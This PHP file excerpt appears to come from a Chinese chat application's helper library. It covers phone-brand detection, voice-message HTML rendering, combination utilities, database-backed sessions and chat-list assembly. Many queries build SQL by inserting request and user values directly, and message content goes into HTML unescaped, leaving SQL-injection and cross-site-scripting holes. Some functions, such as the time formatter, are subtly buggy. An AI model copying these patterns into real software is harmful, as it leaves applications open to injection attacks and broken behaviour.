    } elseif (preg_match("/Nubia|NX50|NX40\s([^\s|;]+)/i", $agent, $regs)) {
        $mobile_brand = "努比亚";
        $mobile_ver = $regs[0];
    } elseif (preg_match("/M045|M032|M355\s([^\s|;]+)/i", $agent, $regs)) {
        $mobile_brand = "魅族";
        $mobile_ver = $regs[0];
    } elseif (preg_match("/Gionee|GN\s([^\s|;]+)/i", $agent, $regs)) {
        $mobile_brand = "金立";
        $mobile_ver = $regs[0];
    } elseif (preg_match("/HS-U|HS-E\s([^\s|;]+)/i", $agent, $regs)) {
        $mobile_brand = "海信";
        $mobile_ver = $regs[0];
    } elseif (preg_match("/Lenove\s([^\s|;]+)/i", $agent, $regs)) {
        $mobile_brand = "联想";
        $mobile_ver = $regs[0];
    } elseif (preg_match("/ONEPLUS\s([^\s|;]+)/i", $agent, $regs)) {
        $mobile_brand = "一加";
        $mobile_ver = $regs[0];
    } elseif (preg_match("/vivo\s([^\s|;]+)/i", $agent, $regs)) {
        $mobile_brand = "vivo";
        $mobile_ver = $regs[0];
    } elseif (preg_match("/K-Touch\s([^\s|;]+)/i", $agent, $regs)) {
        $mobile_brand = "天语";
        $mobile_ver = $regs[0];
    } elseif (preg_match("/DOOV\s([^\s|;]+)/i", $agent, $regs)) {
        $mobile_brand = "朵唯";
        $mobile_ver = $regs[0];
    } elseif (preg_match("/GFIVE\s([^\s|;]+)/i", $agent, $regs)) {
        $mobile_brand = "基伍";
        $mobile_ver = $regs[0];
    } elseif (preg_match("/Nokia\s([^\s|;]+)/i", $agent, $regs)) {
        $mobile_brand = "诺基亚";
        $mobile_ver = $regs[0];
    } else {
        $mobile_brand = "其他";
    }
    return ["brand" => $mobile_brand, "ver" => $mobile_ver];
}

function show_time_format($time)
{
    if (date("Y", $time) != date("Y", time())) {
        return date("Y-m-d H:i:s", time());
    }

    if (date("d", $time) != date("d", time())) {
        return date("m-d H:i:s", time());
    }
    return date("H:i:s", time());
}

function show_me_voice($id)
{
    global $db;
    $value = $db->exec("select * from " . tname("voice") . " where id='{$id}'");
    $src = unserialize($value["src"]);

    $user = get_user_byid($value["uid"]);
    if (count($src) == 1) {
        $listen = 1;
        $content = $src[0];
    } else {
        $listen = 0;
        $content = "";
    }
    if (ceil($value["second"] / 1000) < 60) {
        $padding = ceil($value["second"] / 1000) * 3 + 30;
    } else {
        $padding = 220;
    }
    if ($user["textshow"] == 1) {
        $display = "table-cell";
    } else {
        $display = "none";
    }

    $html =
        " <div class='lines'  ontouchstart=\"gtouchstart({$value["id"]},{$listen},'{$content}');\" ontouchmove=\"gtouchmove({$value["id"]});\" ontouchend=\"gtouchend({$value["id"]},{$listen},'{$content}');\"> 
 <div style='display: inline-block;width: calc(100% - 50px);'> 
      <span class=\"second\"><span class='sec'>" .
        ceil($value["second"] / 1000) .
        "</span> ''</span>
  <div class=\"content\" style='min-width:{$padding}px;' id=\"content_{$value["id"]}\"  >
   <div class='text'  style='display:{$display};'>{$value["content"]}</div>  
          <div class='left'> <img src=\"static/images/voice-3.png\" class=\"listen_ico\">
         
          </div>
           
   
           </div> 
      
              </div> 
           <div style='display: inline-block;float: right'>
            <img src=\"static/images/avatar{$value["per"]}.png\" class=\"avatar\"/>
       
            </div>
            
            <div class='checkbox' id='checkbox_{$value["id"]}'>
             <div class='listen_open' style='display: none'>{$listen}</div>
             <div class='listen_src' style='display: none'>{$content}</div> 
             </div>
            </div>";
    return $html;
}

function show_you_voice($id)
{
    global $db;
    $value = $db->exec("select * from " . tname("voice") . " where id='{$id}'");
    $src = unserialize($value["src"]);

    $user = get_user_byid($value["uid"]);
    if (count($src) == 1) {
        $listen = 1;
        $content = $src[0];
    } else {
        $listen = 0;
        $content = "";
    }
    if (ceil($value["second"] / 1000) < 60) {
        $padding = ceil($value["second"] / 1000) * 3 + 30;
    } else {
        $padding = 220;
    }
    $display = "table-cell";

    $html = " <div class='lines'  ontouchstart=\"gtouchstart({$value["id"]},{$listen},'{$content}');\" ontouchmove=\"gtouchmove({$value["id"]});\" ontouchend=\"gtouchend({$value["id"]},{$listen},'{$content}');\"> 
 <div style='display: inline-block;width: calc(100% - 50px);'> 

  <div class=\"content\" style='min-width:{$padding}px;' id=\"content_{$value["id"]}\"  >
   <div class='text'  style='display:{$display};'>{$value["content"]}</div>  
    
           
   
           </div> 
      
              </div> 
           <div style='display: inline-block;float: left'>
            <img src=\"static/images/listen_avatar.png\" class=\"avatar\"/>
       
            </div>
            
            <div class='checkbox' id='checkbox_{$value["id"]}'>
             <div class='listen_open' style='display: none'>{$listen}</div>
             <div class='listen_src' style='display: none'>{$content}</div> 
             </div>
            </div>";
    return $html;
}

function getCombinationToString($arr, $m)
{
    if ($m == 1) {
        return $arr;
    }
    $result = [];

    $tmpArr = $arr;
    unset($tmpArr[0]);
    for ($i = 0; $i < count($arr); $i++) {
        $s = $arr[$i];
        $ret = getCombinationToString(array_values($tmpArr), $m - 1, $result);

        foreach ($ret as $row) {
            $result[] = $s . "," . $row;
        }
    }

    return $result;
}

//一维数组排列组合

function arr1_plzh($str, $m)
{
    $str1 = "";

    if (!is_array($str) && strpos($str, ",") !== false) {
        $arr = explode(",", $str);
    } else {
        $str1 = implode(",", $str);
        $arr = $str;
        $str = $str1;
    }

    $result = getCombinationToString($arr, $m);

    $new_arr = [];
    foreach ($result as $value) {
        $st1 = explode(",", $value);

        for ($i = 1; $i < count($st1); $i++) {
            $n1 = strpos($str, $st1[$i - 1]);
            $n2 = strpos($str, $st1[$i]);

            if ($n2 <= $n1) {
                $value = "";
                break;
            }
        }
        if ($value != "") {
            $new_arr[] = $value;
        }
    }

    return $new_arr;
}
function arr1_plzh2($str, $m)
{
    if (!is_array($str) && strpos($str, ",") !== false) {
        $arr = explode(",", $str);
    } else {
        $arr = $str;
    }
    $temp = "";
    for ($i = 0; $i < count($arr); $i++) {
        $temp[] = $i;
    }
    $arr1 = arr1_plzh(implode(",", $temp), $m);

    $result = [];
    foreach ($arr1 as $key => $value) {
        $arr2 = explode(",", $value);
        $tt = "";
        foreach ($arr2 as $key2 => $value2) {
            if ($tt == "") {
                $tt = $arr[$value2];
            } else {
                $tt .= "," . $arr[$value2];
            }
        }
        $result[] = $tt;
    }

    return $result;
}

function sort_with_keyName($arr, $orderby = "asc")
{
    $new_array = [];
    $new_sort = [];
    foreach ($arr as $key => $value) {
        $new_array[] = $value;
    }
    if ($orderby == "asc") {
        asort($new_array);
    } else {
        arsort($new_array);
    }
    foreach ($new_array as $k => $v) {
        foreach ($arr as $key => $value) {
            if ($v == $value) {
                $new_sort[$key] = $value;
                unset($arr[$key]);
                break;
            }
        }
    }
    return $new_sort;
}
function arr1_plzh1($str, $m)
{
    if (strpos($str, ",") !== false) {
        $arr = explode(",", $str);
    } else {
        $str1 = "";
        foreach ($str as $value) {
            if ($str1 == "") {
                $str1 = $value;
            } else {
                $str1 .= "," . $value;
            }
        }
        $arr = explode(",", $str1);
        $str = $str1;
    }

    $result = getCombinationToString($arr, $m);

    $new_arr = [];
    foreach ($result as $value) {
        $st1 = explode(",", $value);

        $arr1 = sort_with_keyName($st1);
        $tempnum = 0;
        foreach ($new_arr as $value1) {
            $tempnum = 0;
            foreach ($arr1 as $value2) {
                if (in_array($value2, explode(",", $value1))) {
                    $tempnum++;
                }
            }
            if ($tempnum == $m) {
                $value = "";
                break;
            }
        }
        if ($value != "") {
            $value = implode(",", $arr1);
        }

        //		for($i = 1; $i < count ( $st1 ); $i ++) {
        //
        //			$n1 = strpos ( $str, $st1 [$i - 1] );
        //			$n2 = strpos ( $str, $st1 [$i] );
        //
        //			if ($n2 <= $n1) {
        //				$value = '';
        //				break;
        //			}
        //
        //		}

        if ($value != "" and !in_array($value, $new_arr)) {
            $new_arr[] = $value;
        }
    }

    return $new_arr;
}

//二维数组排列组合
function arr2_plzh($CombinList)
{
    $CombineCount = 1;
    foreach ($CombinList as $Key => $Value) {
        $CombinList[$Key] = explode(",", $Value);
    }

    foreach ($CombinList as $Key => $Value) {
        $CombineCount *= count($Value);
    }
    $RepeatTime = $CombineCount;
    foreach ($CombinList as $ClassNo => $StudentList) {
        // $StudentList中的元素在拆分成组合后纵向出现的最大重复次数
        $RepeatTime = $RepeatTime / count($StudentList);
        $StartPosition = 1;
        // 开始对每个班级的学生进行循环
        foreach ($StudentList as $Student) {
            $TempStartPosition = $StartPosition;
            $SpaceCount = $CombineCount / count($StudentList) / $RepeatTime;
            for ($J = 1; $J <= $SpaceCount; $J++) {
                for ($I = 0; $I < $RepeatTime; $I++) {
                    $Result[$TempStartPosition + $I][$ClassNo] = $Student;
                }
                $TempStartPosition += $RepeatTime * count($StudentList);
            }
            $StartPosition += $RepeatTime;
        }
    }
    $arr = [];
    foreach ($Result as $key => $value) {
        foreach ($value as $k1 => $v1) {
            if ($arr[$key] == "") {
                $arr[$key] = $v1;
            } else {
                $arr[$key] .= "," . $v1;
            }
            $arr[$key] = Lot_01_Num($arr[$key]);
        }
    }

    return $arr;
}

function session($key, $value = "")
{
    global $db, $_REQUEST;
    if ($_REQUEST["agentid"]) {
        $agentid = $_REQUEST["agentid"];
        $fromtime = time() - 3600;
        if ($value == "") {
            $row = $db->exec(
                "select * from " .
                    tname("session") .
                    " where agentid='{$agentid}' and `key`='{$key}' and time>'{$fromtime}' order by time desc"
            );
            return $row["value"];
        } else {
            $db->query(
                "delete  from " .
                    tname("session") .
                    " where agentid='{$agentid}' and `key`='{$key}'"
            );
            $db->query(
                "insert into " .
                    tname("session") .
                    "(`key`,`value`,`time`,`agentid`) values ('{$key}','{$value}','" .
                    time() .
                    "','{$agentid}')"
            );
        }
    } else {
        if ($value == "") {
            return $_SESSION[$key];
        } else {
            $_SESSION[$key] = $value;
        }
    }
}

function friend_addmethod($value)
{
    global $db;
    $arr = [
        "system" => "系统推荐",
        "qrcode" => "扫码添加",
        "search_id" => "搜索彩匠号",
        "search_name" => "搜索用户名",
        "search_mobile" => "搜索手机号",
        "invite" => "邀请注册",
    ];
    if ($arr[$value]) {
        return $arr[$value];
    } else {
        if (strpos($value, "group_") !== false) {
            $arr1 = explode("_", $value);
            if ($arr1[1] > 0) {
                $group = $db->exec(
                    "select * from  " .
                        tname("group") .
                        " where id='{$arr1[1]}'"
                );
                if ($group["title"]) {
                    return "来自群：" . $group["title"];
                }
            }
        }
        return "";
    }
}
function chatList($userid)
{
    global $db, $HttpPath, $system;
    $sql =
        "select * from " .
        tname("chat_list") .
        " where from_uid='{$userid}' or  to_uid='{$userid}'";
    $chat_list = $db->fetch_all($sql);
    $data = [];
    foreach ($chat_list as $key => $v) {
        $cache_key = $v["type"] == 1 ? "U" : 2;
        $data[]["cache_key"] = $cache_key + $v["from_uid"];
    }
    return $chat_list;
}
function lastchat($userid)
{
    global $db, $HttpPath, $system;
    $parent = userinfo($userid);
    $unread = 0;
    $data = [];
    $sql =
        "select * from " .
        tname("group") .
        " where is_delete='0' and  user_id like '%{$userid}%'";
    $group_list = $db->fetch_all($sql);
    if (count($group_list) > 0) {
        foreach ($group_list as $group) {
            $sqlstr = " groupid='{$group["id"]}' and isback='0' and del_uids not like '%@{$userid}@%' and (`type`!='tips' or tip_uid='{$userid}') ";
            $fromtime = get_group_readtime($userid, $group["id"]);
            $isatme = 0;
            //    $chat=$db->exec("select * from ".tname('chat')." where {$sqlstr} and addtime>='{$fromtime}' order by id desc");
            //            if(count($list11)>0){
            //                foreach ($list11 as $key1=>$value1){
            //                    //    $res['temp11'][]=toText(msg_showcontent1($value1,$userid));
            //                    if(strpos(toText(msg_showcontent1($value1,$userid)),'有人@我')!=false){
            //                        $isatme=1;
            //                        $chat=$value1;
            //                        break;
            //                    }
            //                }
            //            }
            //
            //            if($isatme==0)
            $chat = $db->exec(
                "select * from " .
                    tname("chat") .
                    " where groupid='{$group["id"]}' and isback='0' and del_uids not like '%@{$userid}@%' and (`type`!='tips' or tip_uid='{$userid}') order by id desc limit 0,1"
            );

            if ($chat["id"] > 0) {
                $chat["showcontent"] = toText(msg_showcontent1($chat, $userid));
                // $chat['content']=$isatme;
                //   $chat['unread']=get_group_unreadnum($userid,$group['id']);
                $chat["group"] = [
                    "id" => $group["id"],
                    "nickname" => $group["nickname"],
                    "name" => $group["name"],
                    "avatar" => $group["avatar"],
                    "isonline" => $group["isonline"],
                ];

                $chat["sender_name"] = group_username(
                    $group,
                    $chat["userid"],
                    $userid
                );

                $chat["cache_key"] = "G" . $group["id"];
                $chat["istop"] = get_istop($userid, $chat["cache_key"]);
                $chat["isnotip"] = get_isnotip($userid, $chat["cache_key"]);
                $chat["unread"] = get_unreadnum($userid, $chat["cache_key"]);
                $chat["readtime"] = get_readtime($userid, $chat["cache_key"]);

                $chat["isgroup"] = 1;
                $unread += $chat["unread"];
                $data[] = $chat;
            }
        }
    }

    //私信
    $sql ="SELECT c1.id, c1.userid, c1.touid, c1.type, c1.content, c1.addtime
        FROM (
          SELECT MAX(id) AS id
          FROM `".tname('chat')."`
          WHERE groupid='0' AND userid != 1 AND (touid='{$userid}' OR userid='{$userid}') AND del_uids NOT LIKE '%@{$userid}@%' AND isback='0'
          GROUP BY touid
          ORDER BY id DESC
          LIMIT 0,50
        ) AS c2
        JOIN `".tname('chat')."` AS c1 ON c1.id = c2.id";
    $list = $db->fetch_all($sql);

    if (count($list) > 0) {
        $i = 1;
        foreach ($list as $chat) {
            // $chat=  $db->exec("select * from ".tname('chat')." where groupid='0' and userid!=1 and ((touid='{$userid}'   and userid='{$value['userid']}') or (userid='{$userid}' and touid='{$value['userid']}'))  and del_uids not like '%@{$userid}@%' and isback='0' and  (`type`!='tips' or tip_uid='{$userid}')  order by id desc limit 0,1");
            if ($chat["id"] > 0) {
                if ($userid == $chat["userid"]) {
                    $uid = $chat["touid"];
                } else {
                    $uid = $chat["userid"];
                }
                $isin = 0;
                if (count($data) > 0) {
                    foreach ($data as $v1) {
                        // echo '<pre>';
                        // var_dump($v1['cache_key']);
                        // echo '<br>';
                        if ($v1["cache_key"] == "U" . $uid) {
                            // echo $i++;
                            $isin = 1;
                            break;
                        }
                    }
                }
                if ($isin == 0) {
                    $chat["cache_key"] = "U" . $uid;

                    if ($uid == 0) {
                        $group = [
                            "id" => $uid,
                            "nickname" => $system["admin_nickname"],
                            "avatar" => $system["admin_logo"],
                            "kefu" => 2,
                        ];
                    } else {
                        $userinfo = userinfo($uid, $userid);
                        $kefu = 0;
                        if ($userinfo["iskefu"] == 1) {
                            $kefu = 1;
                        }
                        if ($system["admin_id"] == $uid) {
                            $kefu = 2;
                        }
                        if ($parent["pid"] == $uid) {
                            $kefu = 3;
                        }
                        $group = [
                            "id" => $uid,
                            "nickname" => $userinfo["nickname"],
                            "avatar" => $userinfo["avatar"],
                            "kefu" => $kefu,
                            "yearVip" => $userinfo["vip"],
                            "timeVip" => $userinfo["vip_time"],
                            "isonline" => $userinfo["isonline"],
                            "tag_id" => $userinfo["tag_id"],
                        ];
                    }
            
                    $chat["showcontent"] = msg_showcontent1($chat);
                    //   $chat['unread']=get_user_unreadnum($userid,0);
                    if ($chat["userid"] == 0) {
                        $chat["sender_name"] = $system["admin_nickname"];
                    } else {
                        $chat["sender_name"] = $userinfo["nickname"];
                    }
                    $chat["istop"] = get_istop($userid, $chat["cache_key"]);
                    $chat["notip"] = get_isnotip($userid, $chat["cache_key"]);
                    $chat["group"] = $group;
                    $chat["group_id"] = 0;
                    $chat["isgroup"] = 0;
                    // $chat['unread']=get_unreadnum($userid,$chat['cache_key']);
                    $chat["readtime"] = get_readtime(
                        $userid,
                        $chat["cache_key"]
                    );
                    if ($chat["readtime"] >= $chat["addtime"]) {
                        $chat["unread"] = 0;
                    } else {
                        $chat["unread"] = get_unreadnum(
                            $userid,
                            $chat["cache_key"]
                        );
                    }
                    $unread += $chat["unread"];
                    $data[] = $chat;
                }
            }
        }
    }

    //验证消息
    $node_unread = 0;
    $node_date = [];
    $fromtime = time() - 24 * 7 * 3600;
    $str =
        "group_id in (select id from " .
        tname("group") .
        " where (createid='{$userid}' or manager_id  like '%{$userid}%') )  and del_uids not like '%@{$userid}@%'  and addtime>='{$fromtime}' ";
    $sql =
        "select * from " .
        tname("group_apply") .
        " where {$str}  order by addtime desc limit 0,1";
    $chat = $db->exec($sql);
    if ($chat["id"] > 0) {
        $temp = [];
        $temp["groupid"] = 1;
        $temp["sender_name"] = "验证消息";
        $temp["group"] = [
            "id" => 1,
            "nickname" => "验证消息",
            "name" => "验证消息",
            "avatar" => $HttpPath . "static/images/noteico.png",
            "kefu" => 0,
        ];
        $temp["addtime"] = $chat["addtime"];
        $userinfo = userinfo($chat["userid"]);
        $group = $db->exec(
            "select * from " .
                tname("group") .
                " where id='{$chat["group_id"]}'"
        );
        $temp["content"] = $temp["showcontent"] =
            $userinfo["nickname"] . "申请加入" . $group["nickname"];

        $temp["touid"] = 1;
        $temp["type"] = "text";

        $temp["cache_key"] = "U1";
        $readtime = get_readtime($userid, $temp["cache_key"]);
        $row = $db->exec(
            "select count(*) as num from " .
                tname("group_apply") .
                " where addtime>'{$readtime}' and {$str}"
        );

        //   $temp['unread']=$tt['num'];
        $unread += $row["num"];
        $node_unread += $row["num"];
        $temp["unread"] = $row["num"];
        $temp["istop"] = get_istop($userid, $temp["cache_key"]);
        $temp["notip"] = get_isnotip($userid, $temp["cache_key"]);

        $temp["reqtype"] = "group";

        $temp["id"] = 1;
        $temp["isgroup"] = 0;
        $node_date[] = $temp;
    }

    $chat = $db->exec(
        "select * from " .
            tname("request") .
            " where touid='{$userid}'  and del_uids not like '%@{$userid}@%'  order by addtime desc limit 0,1"
    );
    if ($chat["id"] > 0) {
        $temp = [];
        $temp["groupid"] = 1;
        $temp["sender_name"] = "验证消息";
        $temp["group"] = [
            "id" => 1,
            "nickname" => "验证消息",
            "name" => "验证消息",
            "avatar" => $HttpPath . "static/images/noteico.png",
            "kefu" => 0,
        ];
        $temp["addtime"] = $chat["addtime"];
        $userinfo = userinfo($chat["userid"]);

        $temp["content"] = $temp["showcontent"] =
            $userinfo["nickname"] . "申请加您为好友";

        $temp["touid"] = 1;
        $temp["cache_key"] = "U1";
        $temp["type"] = "text";
        $temp["istop"] = get_istop($userid, $temp["cache_key"]);
        $temp["notip"] = get_isnotip($userid, $temp["cache_key"]);
        $readtime = get_readtime($userid, $temp["cache_key"]);
        $row = $db->exec(
            "select count(*) as num from " .
                tname("request") .
                " where addtime>'{$readtime}'  and touid='{$userid}'"
        );
        //   $temp['unread']=$row['num'];

        $unread += $row["num"];
        $node_unread += $row["num"];
        $temp["unread"] = $row["num"];
        $temp["reqtype"] = "friend";
        $temp["id"] = 1;
        $temp["isgroup"] = 0;
        $node_date[] = $temp;
    }
    if (count($node_date) == 2) {
        if ($node_date[0]["addtime"] > $node_date[1]["addtime"]) {
            $data1 = $node_date[0];
        } else {
            $data1 = $node_date[1];
        }
        $data1["unread"] = $node_date[0]["unread"] + $node_date[1]["unread"];
        $data1["readtime"] = get_readtime($userid, $data1["cache_key"]);
        $data[] = $data1;
    } elseif (count($node_date) == 1) {
        $node_date[0]["readtime"] = get_readtime(
            $userid,
            $node_date[0]["cache_key"]
        );
        $data[] = $node_date[0];
    }
    $data = arr_format($data);
    $data1 = [];
    $data2 = [];
    if (count($data) > 0) {
        foreach ($data as $value) {
            if ($value["istop"]) {
                $data1[] = $value;
            } else {
                $data2[] = $value;
            }
        }
    }
    $data1 = list_sort_by($data1, "addtime", "desc");
    $data2 = list_sort_by($data2, "addtime", "desc");

    $data = array_merge($data1, $data2);

    $res["data"] = $data;
    $res["unread"] = $unread;
    $res["code"] = 200;
    return $res;
}
